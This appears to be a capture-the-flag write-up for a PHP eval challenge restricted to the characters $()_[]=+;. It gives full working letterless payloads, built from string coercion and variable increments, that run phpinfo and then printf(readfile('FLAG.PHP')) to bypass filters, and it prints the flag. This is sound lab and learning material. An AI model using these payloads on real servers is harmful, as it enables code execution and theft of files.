# JAILOO WARMUP

We are only allowed to use these characters: $()_[]=+;". 

Webserver evals our input.

We also have a 2000 character cap (found by experimenting)

Found a pretty good resource on this: https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/

Main idea is to
- use underscores for variables names
- use $_=([]."")[([]==[])+([]==[])+([]==[])] to get a lowercase a
- use $_=([]."")[[].[]+[][[]]] to get an uppercase A
- use [varname]++ to increase the ascii value for each of these to get all ascii letters
- take a string and join our characters one by one with .=
- for other characters, we can just join then with .= "char", assuming it is allowed.

Our first goal is to get phpinfo, to see if there are any disabled functions:

Payload:

$_=([]."")[([]==[])+([]==[])+([]==[])];$_++;$_++;$__="";$___=$_;$___++;$___++;$___++;$____=$___;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$____;$_____++;$_____++;$__.=$_____;$____=$___;$____++;$____++;$__.=$____;$__.=$_____;$____++;$__.=$____;$___=$_;$___++;$___++;$___++;$____=$___;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$__.=$____;$___=$_;$___++;$___++;$___++;$____=$___;$____++;$__.=$___;$___=$_;$___++;$___++;$___++;$____=$___;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$__.=$____;$__();

We can see that useful functions which would have allowed us to read from the file like file_get_contents are disabled. However, readfile() is not disabled, so we can use that. We can then use printf() to output that to us.

Our final payload will then eval to: printf(readfile("FLAG.PHP"))

Final payload:

$_=([]."")[([]==[])+([]==[])+([]==[])];$_++;$_++;$__="";$___=$_;$___++;$___++;$___++;$____=$___;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$____;$_____++;$_____++;$__.=$_____;$_____++;$_____++;$__.=$_____;$_____=$___;$_____++;$_____++;$_____++;$__.=$_____;$_____++;$_____++;$_____++;$_____++;$_____++;$__.=$_____;$____++;$____++;$____++;$____++;$____++;$____++;$__.=$____;$__.=$___;$_=([]."")[([]==[])+([]==[])+([]==[])];$_++;$_++;$_++;$_++;$_____="";$______=$_;$______++;$______++;$______++;$_______=$______;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$________=$_______;$________++;$________++;$_____.=$________;$_____.=$_;$_=([]."")[([]==[])+([]==[])+([]==[])];$_____.=$_;$_++;$_++;$_++;$_____.=$_;$_++;$_++;$_____.=$_;$_++;$_++;$_++;$_____.=$_;$_++;$_++;$_++;$_____.=$_;$_=([]."")[([]==[])+([]==[])+([]==[])];$_++;$_++;$_++;$_++;$_____.=$_;$_=([]."")[[].[]+[][[]]];$_______="";$________=$_;$________++;$________++;$________++;$________++;$________++;$_______.=$________;$_________=$________;$_________++;$_________++;$_________++;$_________++;$_________++;$_________++;$_______.=$_________;$_______.=$_;$_________=$________;$_________++;$_______.=$_________;$_______.=".";$_________++;$__________=$_________;$__________++;$__________++;$__________++;$__________++;$__________++;$__________++;$__________++;$__________++;$_______.=$__________;$_______.=$_________;$_______.=$__________;$__($_____($_______));

#### Flag: FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}


(need to view source to see it)